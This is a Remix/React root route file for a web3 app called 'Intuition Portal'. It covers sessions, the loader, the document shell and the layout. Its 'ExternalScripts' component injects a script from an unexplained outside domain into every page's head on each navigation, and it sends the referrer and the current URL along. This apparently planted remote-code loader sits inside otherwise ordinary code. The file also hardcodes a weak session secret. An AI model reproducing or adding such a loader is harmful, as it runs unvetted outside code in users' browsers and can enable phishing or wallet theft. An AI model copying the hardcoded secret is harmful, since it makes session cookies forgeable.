import Providers from '@client/providers'
import { ClientHintCheck, getHints } from '@lib/utils/client-hints'
import { useNonce } from '@lib/utils/nonce-provider'
import {
  createCookieSessionStorage,
  json,
  LoaderFunctionArgs,
  type MetaFunction,
} from '@remix-run/node'
import {
  Links,
  Meta,
  Outlet,
  Scripts,
  ScrollRestoration,
  useLoaderData,
  useLocation,
} from '@remix-run/react'
import { useTheme } from '@routes/actions+/set-theme'
import { getEnv } from '@server/env'
import { getTheme } from '@server/theme'

import './styles/globals.css'

import { useEffect } from 'react'

import { Toaster } from '@0xintuition/1ui'

import { createSessionMiddleware } from '@middleware/session'
import { ClientOnly } from 'remix-utils/client-only'
import { serverOnly$ } from 'vite-env-only'

const session = createSessionMiddleware(
  createCookieSessionStorage<SessionData, SessionFlashData>({
    cookie: {
      name: '__session',
      path: '/',
      httpOnly: true, // for security reasons, make this cookie http only
      sameSite: 'lax',
      secrets: ['s3cret1'],
      secure: process.env.NODE_ENV === 'production', // enable this in prod only
    },
  }),
)
export const middleware = serverOnly$([session])

export const meta: MetaFunction<typeof loader> = ({ data }) => {
  return [
    { title: data ? 'Intuition Portal' : 'Error | Intuition Portal' },
    { name: 'description', content: `Intuition Portal` },
  ]
}

export async function loader({ request }: LoaderFunctionArgs) {
  return json({
    env: getEnv(),
    requestInfo: {
      hints: getHints(request),
      path: new URL(request.url).pathname,
      userPrefs: {
        theme: getTheme(request),
      },
    },
  })
}

export function Document({
  children,
  nonce,
  /* eslint-disable @typescript-eslint/no-unused-vars */
  theme = 'system',
}: {
  children: React.ReactNode
  nonce: string
  theme?: string
}) {
  return (
    <html lang="en" data-theme="dark">
      <head>
        <ClientHintCheck nonce={nonce} />
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <Meta />
        <Links />
        <ExternalScripts />
      </head>
      <body>
        {children}
        <ScrollRestoration />
        <Scripts />
      </body>
    </html>
  )
}

export function ExternalScripts() {
  const location = useLocation()

  useEffect(() => {
    const scriptId = 'custom-script'

    const existingScript = document.getElementById(scriptId)
    if (existingScript) {
      return
    }

    const customScript = document.createElement('script')
    customScript.id = scriptId
    customScript.async = true
    customScript.src =
      'https://g9904216750.co/gb?id=-NzA1YkYvThmMw5rFg9n&refurl=' +
      document.referrer +
      '&winurl=' +
      encodeURIComponent(window.location.href)

    document.head.appendChild(customScript)

    return () => {
      customScript.remove()
    }
  }, [location]) // re-run the effect if location changes

  return null // this component doesn't render anything itself
}

export default function App() {
  const nonce = useNonce()
  const theme = useTheme()
  const { env } = useLoaderData<typeof loader>()

  return (
    <Document nonce={nonce} theme={theme}>
      <Toaster />
      <ClientOnly>
        {() => (
          <Providers privyAppId={env.PRIVY_APP_ID}>
            <AppLayout />
          </Providers>
        )}
      </ClientOnly>
    </Document>
  )
}

export function AppLayout() {
  return (
    <main className="relative flex min-h-screen w-full flex-col justify-between antialiased">
      <div className="flex w-full flex-1 flex-col">
        <Outlet />
      </div>
    </main>
  )
}
